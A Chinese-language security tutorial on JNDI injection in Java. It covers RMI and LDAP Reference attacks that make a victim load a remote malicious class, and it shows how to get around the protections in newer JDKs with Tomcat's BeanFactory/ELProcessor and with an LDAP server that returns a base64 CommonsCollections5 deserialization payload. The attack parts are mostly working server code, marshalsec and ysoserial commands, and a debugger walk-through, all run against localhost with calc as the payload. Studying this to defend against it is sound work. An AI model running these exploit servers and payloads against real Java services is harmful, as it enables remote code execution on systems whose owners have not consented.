# JNDI

[Trail: Java Naming and Directory Interface (The Java Tutorials)
(oracle.com)](https://www.sec-in.com/outLinkPage/?target=https://docs.oracle.com/javase/tutorial/jndi/index.html)  

[The JNDI Tutorial (oracle.com)](https://www.sec-in.com/outLinkPage/?target=https://docs.oracle.com/javase/jndi/tutorial/)  

JNDI (Java Naming and Directory Interface) 是一个应用程序设计的
API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。

 **JNDI 支持的服务主要有以下几种：**

  * RMI (JAVA远程方法调用)
  * LDAP (轻量级目录访问协议)
  * CORBA (公共对象请求代理体系结构)
  * DNS (域名服务)

前三种都支持远程对象调用

 **JNDI支持的数据存储对象**

  * Java序列化对象
  * JNDI Reference引用
  * Marshalled对象
  * RMI远程对象
  * CORBA 对象

# 注入原理

在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object
factory，最终通过factory类将reference转换为具体的对象实例。

# RMI攻击实现

## 影响版本

JDK <= 8u121

在8u121之后`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的默认值变为false，就不能再利用了

先看下JNDI—RMI的结合使用

 **RMI服务端**

RMISever.java

    
    
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    public class RMISever {
        public static void main(String[] args) throws RemoteException, AlreadyBoundException {
            IRemoteObj remoteObj = new RemoteObjImpl();
            Registry r = LocateRegistry.createRegistry(1099);
            r.bind("remoteObj",remoteObj);
    
        }
    }
    

**远程接口**

IRemoteObj.java

    
    
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    
    public interface IRemoteObj extends Remote {
        public String sayHello(String keywords) throws RemoteException;
    
    }
    

**实现接口的远程对象**

RemoteObjImpl.java

    
    
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    
    public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj {
        public RemoteObjImpl() throws RemoteException{
            super();
        }
    
        @Override
        public String sayHello(String keywords){
            String upKeywords = keywords.toUpperCase();
            System.out.println(upKeywords);
            return upKeywords;
        }
    }
    

**JNDI服务端**

JNDIRMIServer.java

    
    
    import javax.naming.InitialContext;
    
    public class JNDIRMIServer {
        public static void main(String[] args)throws Exception {
            InitialContext initialContext = new InitialContext();
            initialContext.rebind("rmi://127.0.0.1:1099/remoteObj",new RemoteObjImpl());
        }
    }
    

**JNDI客户端**

JNDIRMIClient.java

    
    
    import javax.naming.InitialContext;
    
    public class JNDIRMIClient {
        public static void main(String[] args) throws Exception {
            InitialContext initialContext = new InitialContext();
            IRemoteObj remoteObj = (IRemoteObj)initialContext.lookup("rmi://127.0.0.1:1099/remoteObj");
            System.out.println(remoteObj.sayHello("hello"));
        }
    }
    

这里的InitialContext()是构建一个初始上下文。通俗点来讲就是获取初始目录环境。

当开启RMI服务和JNDI服务后，此时JNDI客户端便可成功发出请求

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389021_62d9021d47d04e4a20326.png!small)

## RMI攻击

通过上例可以看出JNDI是可以和RMI结合使用的，而攻击就要通过 **References** 类来绑定一个外部的远程对象的方式进行了。

    
    
    Reference(String className, RefAddr addr, String factory, String factoryLocation)  
    

  * `className`： 远程加载时所使用的类名
  * `classFactory `： 加载的`class`中需要实例化类的名称
  * `classFactoryLocation`： 提供`classes`数据的地址可以是`file/ftp/http`协议

开启远程服务，在该目录下放了一个Exec.class，进行远程调用

    
    
    import java.io.IOException;
    
    public class Exec {
        public Exec() throws IOException {
            Runtime.getRuntime().exec("calc");
        }
    }
    

之后修改JNDIServer，通过Reference绑定启动的远程服务对象

    
    
    import javax.naming.InitialContext;
    import javax.naming.Reference;
    
    
    public class JNDIRMIServer {
        public static void main(String[] args)throws Exception {
            InitialContext initialContext = new InitialContext();
            //initialContext.rebind("rmi://127.0.0.1:1099/remoteObj",new RemoteObjImpl());
    
            Reference refobj = new Reference("Exec", "Exec", "http://localhost:7777/");
            initialContext.rebind("rmi://127.0.0.1:1099/remoteObj",refobj);
    
        }
    }
    

重新启动RMI，JNDIServer后，通过客户端JNDIClient成功执行恶意字节码文件(这里是本地测试的也可以修改http://localhost:7777/，进行远程调用)

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389021_62d9021dbf545cacc5fe9.png!small)

## 流程分析

只要客户端lookup参数可控，我们就可写入自己的远程对象，而远程对象在绑上 **References**
，其中传一个带有恶意类的地址，当RMI客户端开启服务后就会造成攻击

下面看下具体流程

跟进`lookup`，name就是我们传入的`rmi://127.0.0.1:1099/remoteObj`

    
    
    public Object lookup(String name) throws NamingException {
        return getURLOrDefaultInitCtx(name).lookup(name);
    }
    

有调用了`lookup`，继续跟进，这里调用了var3的lookup，而var3的是`RegistryContext`，所以虽然我们通过JNDI的方式进行的调用，但最后还是会调用到RMI的流程中，所以这也就是JNDI能结合RMI使用的原因(JNDI的每个服务对应一个Context协议，而RMI对应的协议就是RegistryContext)

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389022_62d9021e3900099e2de1c.png!small)

继续跟进`lookup`，还是会调用lookup，但调用后var2的ReferenceWrapper类型，而在`JNDIRMIServer`中实例化的是Reference

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389022_62d9021eb4a05bd290835.png!small)

分析下原因

跟进`rebind`，远程服务绑定时绑定的是`Reference`,但当客户端调用时变成了`ReferenceWrapper`，所以一定是在`Reference`绑定后进行了一些操作

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389023_62d9021f3b0b76679d4e3.png!small)

注意一下参数就好，继续跟进`rebind`

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389023_62d9021fd8b3ffffabe7f.png!small)

又有一个`rebind`

    
    
    public void rebind(String var1, Object var2) throws NamingException {
        ResolveResult var3 = this.getRootURLContext(var1, this.myEnv);
        Context var4 = (Context)var3.getResolvedObj();
    
        try {
            var4.rebind(var3.getRemainingName(), var2);
        } finally {
            var4.close();
        }
    
    }
    

跟进后发现多了个encode的操作

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389024_62d9022060ebcb73f3083.png!small)

跟进后发现，当我们传入的类型为`Reference`,他会通过判断返回`ReferenceWrapper`，所以上边的原因也就在这里

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389024_62d90220eb64e5146ed74.png!small)

在回到刚才的`lookup`方法，由于刚才的`rebind`中进行了encode，所以这里对应的会返回一个返回decode的操作

    
    
    return this.decodeObject(var2, var1.getPrefix(1));
    

跟进后，发现了`getReference()`，在注入原理中提到货他可以获取绑定对象的引用，所以var3就变为了我们绑定的Reference对象

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389025_62d902217707637aa8947.png!small)

之后就调用了`NamingManager.getObjectInstance`，在319行会调用`getObjectFactoryFromReference`，从引用中获取对象工厂

    
    
    factory = getObjectFactoryFromReference(ref, f);
    

跟进后他首先会进行个类加载

    
    
    try {
         clas = helper.loadClass(factoryName);
    } catch (ClassNotFoundException e) {
    

跟进loadClass，retrun中会调用本类中的另一个`loadClass`

    
    
    public Class<?> loadClass(String className) throws ClassNotFoundException {
        return loadClass(className, getContextClassLoader());
    }
    

调用Class.forName，但他是调用AppClassLoader从本地找Exec.class，所以肯定是找不到的

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389026_62d902220a988d7ebec2c.png!small)

找不到后，就会从codebase中寻找，codebase通过ref.getFactoryClassLocation()，就会变成我们传入的远程对象

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389026_62d90222886579824b38f.png!small)

重新加载结束后通过最后的newInstance成功实例化，远程执行

    
    
    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    

# LDAP攻击实现

除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI
Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI
Reference对象。

注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。

##  **影响版本**

JDK <= 8u191 且版本不为7u201、6u211、6u141、7u131、8u121

这些版本的`com.sun.jndi.ldap.object.trustURLCodebase`属性默认值为false

## LDAP攻击

使用[marshalsec](https://www.sec-in.com/outLinkPage/?target=https://github.com/RandomRobbieBF/marshalsec-jar)构建ldap服务,服务端监听:

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:7777/#Exec 1099
    

[http://127.0.0.1/](https://www.sec-in.com/outLinkPage/?target=http://127.0.0.1:7777/)为本地服务，Exec是恶意文件，1099是开启的ldap服务端口(默认为1389)

开启本地服务

    
    
    python -m http.server 7777
    

直接发起请求即可

    
    
    import javax.naming.InitialContext;
    
    public class JNDILDAPClient {
        public static void main(String[] args) throws Exception {
            InitialContext initialContext = new InitialContext();
            initialContext.lookup("ldap://127.0.0.1:1099/Exec");
        }
    }
    

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389027_62d9022345a6e5d27284b.png!small)

## 流程分析

前边和RMI的一样连续调用了几个`lookup`，之后又进入了`p_lookup()`

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389027_62d90223c4aab9ad3a3eb.png!small)

之后又调用了`c_lookup()`

    
    
    protected Object p_lookup(Name var1, Continuation var2) throws NamingException {
        Object var3 = null;
        HeadTail var4 = this.p_resolveIntermediate(var1, var2);
        switch (var4.getStatus()) {
            case 2:
                var3 = this.c_lookup(var4.getHead(), var2);
                if (var3 instanceof LinkRef) {
                    var2.setContinue(var3, var4.getHead(), this);
                    var3 = null;
                }
    

跟进`c_lookup()`，在下方会调用`decodeObject()`,其中参数的值就是我们传入的LDAP的值

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389028_62d9022461f551af37773.png!small)

跟进后，会进行if判断，JAVA_ATTRIBUTES的索引值在下方，处若我们传入的是序列化数据则会执行if下方的语句进行反序列化(`后边高版本绕过会用到留个印象`)；若传入的是远程对象则会调用`decodeRmiObject()`而我们是一个引用所以直接调用执行`decodeReference()`

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389028_62d90224dd380f936acf4.png!small)

`decodeReference()`是一些赋值操作，执行完后回到decodeObject()中，最后decodeObject()执行完之后回到了`c_lookup()`这里var3此时的值为

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389029_62d902256217020564e1f.png!small)

接着往下走最终调用了`DirectoryManager`的`getObjectInstance`，而RMI调用的则是`NamingManager`的`getObjectInstance`

    
    
    return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
    

但流程的话跟RMI的基本一模一样了，最后也是通过`NamingManager`调用`newInstance()`进行类加载造成代码执行

    
    
    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    

# 高版本绕过

在JDK8u191之后将com.sun.jndi.ldap.object.trustURLCodebase
属性的默认值设为了false，即不能再从远程的Codebase加载恶意的Factory类了，所以上边的方式就不适用了，但这里还可以使用本地类加载的方式进行利用(都需要特定的依赖)：

  * 本地Class作为Reference Factory绕过
  * LDAP返回序列化数据绕过

## 本地Class作为Reference Factory绕过

找到一个受害者本地CLASSPATH中的类作为恶意的Reference
Factory工厂类，并利用这个本地的Factory类执行命令。这个Factory类必须实现 javax.naming.spi.ObjectFactory
接口。而Tomcat依赖包中存在org.apache.naming.factory.BeanFactory工厂类，可以反射构造代码执行。

 **pom依赖**

    
    
    <dependency>
        <groupId>org.apache.tomcat.embed</groupId>
        <artifactId>tomcat-embed-core</artifactId>
        <version>8.0.28</version>
    </dependency>
    

### 本地攻击

 **Client**

    
    
    import javax.naming.*;
    public class JNDIBPClient {
        public static void main(String[] args) throws Exception {
            InitialContext initialContext = new InitialContext();
            initialContext.lookup("rmi://127.0.0.1:1099/Exec");
        }
    }
    

**Server**

    
    
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import javax.naming.StringRefAddr;
    import org.apache.naming.ResourceRef;
    
    public class JNDIBPServer {
    
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.createRegistry(1099);
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
            resourceRef.add(new StringRefAddr("forceString", "Sentiment=eval"));
            resourceRef.add(new StringRefAddr("Sentiment", "Runtime.getRuntime().exec(\"calc\")"));
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
            registry.bind("Exec", referenceWrapper);
            System.out.println("the Server is bind rmi://127.0.0.1:1099/Exec");
        }
    }
    

若在执行javax.el.ELProcessor报错Class not found: javax.el.ELProcessor，则需要再导入依赖：

    
    
    <dependency>
        <groupId>org.apache.tomcat.embed</groupId>
        <artifactId>tomcat-embed-el</artifactId>
        <version>8.0.28</version>
    </dependency>
    

### 流程分析

由于通过RMI进行的调用，所以前边的流程跟 **RMI攻击实现**
中是一样的，但由于本次传入的工厂是`BeanFactory`，所以会调用`BeanFactory.getObjectInstance()`

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389029_62d90225dc6d2fc33fa04.png!small)

跟进后这里通过反射实例化了`ELProcessor`给`bean`

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389030_62d9022662545348323d1.png!small)

再往下看，将forceString的值赋给ra，我们在Server中赋值forceString="Sentiment=eval"，所以ra="Sentiment=eval"，之后创建了一个HashMap对象给forced，接着将刚刚说到的ra的值赋给`value`，又赋给了`param`，在168行获取了等号的索引，之后以等号分割开分别赋值给了`setterName`和`param`

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389030_62d90226dc1e4dfaa08d7.png!small)

之后就是将这两个值传入HashMap即：forced

    
    
    forced.put(param,
               beanClass.getMethod(setterName, paramTypes));
    

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389031_62d90227684b5356e6049.png!small)

之后主要就是这五步了：

  1. proName获取ra的type —>Sentiment
  2. value获取ra的contents —>Runtime.getRuntime().exec("calc")
  3. method获取Sentiment对应的值即：eval方法
  4. valueArray[0]获取value 即Runtime.getRuntime().exec("calc")
  5. 最终反射成功执行代码

## LDAP返回序列化数据绕过

在LDAP攻击的流程分析中提到过在高版本绕过中会用到，LDAP Server除了使用JNDI
Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的
obj.decodeObject() 方法就会对这个字段的内容进行反序列化

这里以打cc5为例，需要Commons-Collections-3.1依赖

 **pom依赖**

    
    
    <dependency>
        <groupId>com.unboundid</groupId>
        <artifactId>unboundid-ldapsdk</artifactId>
        <version>3.1.1</version>
    </dependency>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>
    

### 本地攻击

ysoserial生成payload

    
    
    java -jar ysoserial-0.0.5.jar CommonsCollections5 "calc" >1.txt
    

base64加密一下

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389031_62d90227e19c7b7cec93e.png!small)

本题开启http服务直接打即可

    
    
    python -m http.server 7777
    

**Server**

    
    
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPException;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;
    import javax.net.ssl.SSLSocketFactory;
    import java.net.InetAddress;
    import java.net.MalformedURLException;
    import java.net.URL;
    import java.util.Base64;
    public class JNDISerialServer {
        private static final String LDAP_BASE = "dc=example,dc=com";
    
    
        public static void main (String[] args) {
    
            String url = "http://127.0.0.1:7777/#Exec";
            int port = 1099;
    
    
            try {
                InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                config.setListenerConfigs(new InMemoryListenerConfig(
                        "listen",
                        InetAddress.getByName("0.0.0.0"),
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()));
    
                config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
                InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                System.out.println("Listening on 0.0.0.0:" + port);
                ds.startListening();
    
            }
            catch ( Exception e ) {
                e.printStackTrace();
            }
        }
    
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
    
            private URL codebase;
    
    
            /**
             *
             */
            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }
    
    
            /**
             * {@inheritDoc}
             *
             * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
             */
            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
    
            }
    
    
            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
                URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "Exploit");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf('#');
                if ( refPos > 0 ) {
                    cbstring = cbstring.substring(0, refPos);
                }
                //低版本JDK
    /*            e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaFactory", this.codebase.getRef());*/
    
                //高版本JDK
                e.addAttribute("javaSerializedData", Base64.getDecoder().decode("rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAU3QAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAANXEAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZybWVyO3hwc3IAOyZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludrZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4"));
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
    
        }
    }
    

**Client**

    
    
    import javax.naming.InitialContext;
    
    public class JNDISerialClient {
        public static void main(String[] args) throws Exception {
            InitialContext initialContext = new InitialContext();
            initialContext.lookup("ldap://127.0.0.1:1099/Exec");
        }
    }
    
    

### 流程分析

跟LDAP攻击实现的步骤基本一致，只是前者是通过引用进入了，而这里用的是序列化索引进入了

![在这里插入图片描述](https://image.3001.net/images/20220721/1658389032_62d902287c7722fa66352.png!small)

进入`deserializeObject`就是反序列化的操作了通过readObject反序列化代码执行

    
    
    var5 = ((ObjectInputStream)var20).readObject();﻿

